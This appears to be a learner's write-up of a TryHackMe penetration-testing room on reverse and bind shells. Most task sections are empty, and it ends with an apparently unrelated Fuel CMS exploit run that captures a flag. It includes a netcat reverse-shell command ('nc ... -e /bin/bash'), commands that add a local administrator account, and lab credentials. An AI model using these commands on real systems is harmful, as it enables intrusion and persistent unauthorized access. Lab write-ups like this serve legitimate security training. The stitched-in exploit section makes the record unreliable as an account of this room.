<h3> Welcome to the <em>TryHackMe ...</em></h3>
<h1>Jr Penetration Tester learning path > Privilege Escalation ></h1>
<h2>What the Shell?</h2>
<p>An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.</p>
<br>
<p>October 28, 2024<br></p>
<br>

<div style="display: flex; justify-content: center; align-items: center;">
    <img src="https://github.com/user-attachments/assets/5d1db623-8135-49c1-ae8e-84d51143d515" width="150px" height="150px"/>
</div>
<br>

![image](https://github.com/user-attachments/assets/1fc95fc4-1200-46b9-a2f4-66f0de4c423e)


<p>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s key part of my 30-day-streak in <a href="https://www.wicys.org/benefits/security-training-scholarship/">WiCyS SANS Security Training</a> Stage 2 Program.<br><br>
Let´s get started!!<br><br>
Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/introtoshells">What the Shell?</a>.<br>
<code>Note</code>: only subscribers can deploy Virtual Machines in this room.</p>

<h2>Task 1 - What the Shell?</h2>
<br>


> 1.1 - <em>Let's get hacking.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 2 - Exploit the Machine (Flag Submission)</h2>
<br>
<p>Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually is. In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.<br>

In simple terms, we can force the remote server to either send us command line access to the server (a <code>reverse</code> shell), or to open up a port on the server which we can connect to in order to execute further commands (a <code>bind</code> shell).<br>

We will be covering both of these scenarios in further detail throughout the room.<br>

The format of this room is as follows:</p>



<h2>Task 2 - Tools</h2>
<br>


<h2>Task 3 - Types of Tools</h2>
<br>

<h2>Task 4 - Netcat</h2>
<br>

<h2>Task 5 - Netcat Shell Stabilisation</h2>
<br>

<h2>Task 6 - Socat</h2>
<br>

<h2>Task 7 - Socat Encrypted Shells</h2>
<br>


<h2>Task 8 - Common Shell Payloads</h2>
<br>

<h2>Task 9 - msfvenom</h2>
<br>

<h2>Task 10 - Metasploit multi/handler</h2>
<br>

<h2>Task 11 - WebShells</h2>
<br>

<h2>Task 12 - Next Steps</h2>
<p></p>

<u> Ok, we have a shell. Now what? </u>

<br>

<p>We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?<br>

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at <code>/home/<user>/.ssh</code> are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like <a href="https://tryhackme.com/r/room/introtoshells](https://dirtycow.ninja/)">Dirty C0w</a> or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.<br>



On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code>
 or <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code><br>
. These can be MD5 hashes or in plaintext, depending on the version.<br>

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.<br>

The syntax for this is as follows:<br>
<code>net user <username> <password> /add</code><br>
<code>net localgroup administrators <username> /add</code><br>

<br>
<br>

<p><u></u>The important take away from this task:</p>u></p><br><br><br>
<p>Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.</p>

> 12.1 - <em>Read the above information.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>


<h2>Task 13 - Practice and Examples</h2>
<br>

<p>This room contained a lot of information, and gave you little opportunity to put it into practice throughout. The following two tasks contain virtual machines (one Ubuntu 18.04 server and one Windows server), each configured with a simple webserver with which you can upload and activate shells. This is a sandbox environment, so there will be no filters to bypass. Login credentials and instructions for each will also be given, should you wish to log in to practice with netcat, socat or meterpreter shells.<br>

The remainder of this task will consist of shell examples for you to try out on the practice boxes.</p>

> 13.1 - <em>Try uploading a webshell to the Linux box, then use the command: <code>nc <LOCAL-IP> <PORT> -e /bin/bash</code> to send a reverse shell back to a waiting listener on your own machine.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.2 - <em>Navigate to <code>/usr/share/webshells/php/php-reverse-shell.php</code> in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.3 - <em>Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.4 - <em>Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.5 - <em>Look through <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the Things</a> and try some of the other reverse shell techniques. Try to analyse them and see why they work.</em>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.6 - <em>Switch to the Windows VM. Try uploading and activating the <code>php-reverse-shell</code>. Does this work?</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.7 - <em>Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.8 - <em>The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.9 - <em>Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.10 - <em>Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

> 13.11 - <em>Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 14 - Linux Practice Box</h2>
<br>

<p>The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:</p>

<ul style="list-style-type:square">
    <li><code>Username</code>: shell</li>
    <li><code>Password</code>: TryH4ckM3!</li>
</ul></p>

> 14.1 - <em>No answer required</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>

<h2>Task 15 - Windows Practice Box</h2>
<br>

<p>This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:</p>

<ul style="list-style-type:square">
    <li><code>Username</code>: Administrator</li>
    <li><code>Password</code>: TryH4ckM3!</li>
</ul></p>

<p>To login using RDP:</p>
<p><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.205.224 /u:Administrator /p:'TryH4ckM3!'</code></p>

> 15.1 - <em>No answer required</em><br>
>> <code><strong>No answer needed</strong></code><br>
<p><br></p>




<br>
<br>
<br>











<pre><code>$ example
</code></pre>
<br>


<br>
<p>I did not continue using the file I downloaded from Exploit DB because it was presenting an error.</p>
<p>Proceeded copying the following:  <a href="https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py">Vulnerability Capstone</a><br><br>
I set a listener.</p><br>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]
</code></pre>
<br>

<p>Then I run the exploit with <code>python</code> against the <code>Target Machine</code>.</p>

<pre><code>$ python3 fuel-cms.py [Target_IP]
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 

Tested on 1.4                                       

Created by Ac1d

	Menu

exit     -	Exit app
shell_me -	Get a reverse shell (netcat) 
help     -	Show this help

fuelCMS$ shell_me
Enter your attacking machine IP:PORT $ [Attack_IP]:[Port]
   
</code></pre>
<br>

<p>After typing option <code>shell_me</code>, I got access to the <code>Target Machine</code>.</p>

<br>

<p>And I got access to the <code> Target Machine</code>.</p>

<pre><code>$ root@[Attack_IP]:~# nc -lvnp [Port]

Listening on [0.0.0.0] (family 0, port [Port])
Connection from [Target_IP] [Target_Port] received!
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/var/www/html/fuelcms
$ whoami
www-data
$ cd /home/ubuntu
$ ls -la
total 40
drwxr-xr-x 5 ubuntu ubuntu 4096 Sep  3  2021 .
drwxr-xr-x 3 root   root   4096 Sep  3  2021 ..
-rw------- 1 ubuntu ubuntu  178 Sep  3  2021 .Xauthority
lrwxrwxrwx 1 ubuntu ubuntu    9 Sep  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .cache
drwxrwxr-x 3 ubuntu ubuntu 4096 Sep  3  2021 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Sep  3  2021 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Sep  3  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 ubuntu ubuntu   23 Sep  3  2021 flag.txt
$ cat flag.txt
THM{ACKME_BLOG_HACKED}
</code></pre>
<br>

<h2>Room Complete</h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/80a2a3bc-f069-46cc-ace2-006c45bbd4a9)

<h2>My journey</h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

![image](https://github.com/user-attachments/assets/d1097bf7-819c-4529-a163-5c119e8bd770)

<p></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

